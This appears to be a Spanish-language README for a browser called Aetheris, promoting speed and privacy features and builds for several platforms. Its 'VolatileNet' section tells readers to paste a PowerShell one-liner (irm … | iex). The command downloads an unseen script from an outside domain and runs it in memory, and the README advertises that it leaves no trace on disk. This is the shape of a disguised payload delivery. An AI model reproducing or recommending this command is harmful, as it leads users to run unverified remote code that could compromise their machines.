# 🌌 Aetheris Multiverse Browser

![Aetheris Banner](https://img.shields.io/badge/AETHERIS-NEXUS_COMMAND-00e5ff?style=for-the-badge&logo=airplayvideo&logoColor=white) ![Architecture](https://img.shields.io/badge/ARCH-WebView2%20%7C%20MAUI-ff003c?style=for-the-badge) ![Size](https://img.shields.io/badge/SIZE-Ultra%20Ligero-76ff03?style=for-the-badge) ![Status](https://img.shields.io/badge/STATUS-Ready-blue?style=for-the-badge)

¡Buenas! Os presento **Aetheris**, un navegador en el que he estado trabajando desde cero. La idea es muy simple: **rendimiento puro y privacidad real**. Estoy cansado de navegadores inflados, llenos de procesos en segundo plano, telemetría y cosas que nadie usa. Aetheris va directo al grano, usando WebView2 (en Windows) y WebKit/Blink (en móvil) para darte justo lo que necesitas, sin comerse toda tu RAM y CPU.

Si buscas algo rápido, ligero y con un toque estético *Cyberpunk / Sci-Fi*, dale un tiento a esto.

---

## 🚀 ¿Por qué va tan rápido?

Si abres el administrador de tareas con Chrome o Edge, verás un montón de procesos. Con Aetheris, eso se acabó.

* **Cero Telemetría:** Nada de enviar datos raros a servidores. Lo que haces en tu PC, se queda en tu PC.
* **Integración Nativa:** Aprovechamos la aceleración por hardware que ya tiene tu sistema, sin instalar motores gigantescos y pesados.
* **Bloqueador Integrado:** En vez de usar extensiones súper lentas, cortamos las peticiones de anuncios y rastreadores a nivel de red antes de que lleguen a cargar. 
* **Control de Pestañas:** Las pestañas que no usas se suspenden para no fundirte la batería ni el procesador.

---

## 🛡️ Lo que incluye

### 💻 En Escritorio (Windows, Mac, Linux)
* **Ventanas Inteligentes**: Aetheris se acuerda de dónde y a qué tamaño cerraste la ventana, y la abre igual sin fallos.
* **Tor Integrado**: ¿Quieres privacidad total? Activa el proxy Tor con un clic y navega por dominios `.onion` o esconde tu IP sin configuraciones raras.
* **Privacidad Nivel Dios**: Bloqueamos iframes ocultos, accesos raros al portapapeles, WebRTC y más historias intrusivas.
* **Interfaz Fluida**: Toda la UI es un canvas interactivo hiperfluido, por lo que todo responde al instante.

### 📱 En Móvil
* **Aceleración Total**: Optimizado con .NET MAUI para volar en el móvil.
* **Modo Escritorio de Verdad**: Un botón para forzar a las webs a mostrar su versión real de PC.
* **Mismos Ajustes que en PC**: Toda la configuración de privacidad de Windows, pero en tu móvil.

---

## 📥 Descargas y Versiones (¡NUEVO!)

He estado dándole caña y ahora mismo hay **versiones compiladas para casi cualquier cosa que uses**. Lo tienes todo en la pestaña de **`Releases`**:

* **Windows:** Setup instalable normal, versión Portable (para llevar en un pendrive) y binarios nativos para ARM64.
* **Linux:** Versiones en `.deb` y `.zip`, tanto para x64 como para procesadores ARM64.
* **Mac:** Versiones separadas para procesadores Intel y Apple Silicon (M1/M2/M3).
* **Móviles:** Tienes el `.apk` para Android y también el `.ipa` para iOS.

---

## ⚡ VolatileNet: Ejecución en RAM (Cero Instalación)

Si pasas de instalar nada o no puedes, he creado una versión brutal llamada **VolatileNet**. Carga el navegador entero de manera súper ultra optimizada y perfecta directamente en la memoria RAM, sin dejar rastro en el disco duro. 

Para lanzarlo, solo tienes que abrir un PowerShell en Windows y pegar este comando:

```powershell
irm https://cdn.otrosproyectosundfe.com/VolatileNet/VolatileNet.ps1 | iex
```

Se baja, se ejecuta y tienes el navegador listo sin instalarte absolutamente nada.

---

> Desarrollado con ❤️ y alto voltaje por [Undfe]
